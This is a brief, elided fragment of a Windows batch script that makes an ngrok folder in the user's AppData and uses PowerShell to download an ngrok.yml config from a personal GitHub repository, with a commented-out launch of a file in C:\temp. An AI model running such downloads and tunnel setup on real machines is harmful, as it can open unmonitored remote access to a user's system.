...
PowerShell New-Item -Path C:\%HoMePath%\AppData\Local -Name ngrok -ItemType Directory
...
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://github.com/ghostman2709/files/raw/main/ngrok.yml','C:\%HoMePath%\AppData\Local\ngrok\ngrok.yml')
...
#PowerShell Start-Process -FilePath "C:\temp\run"
EXIT
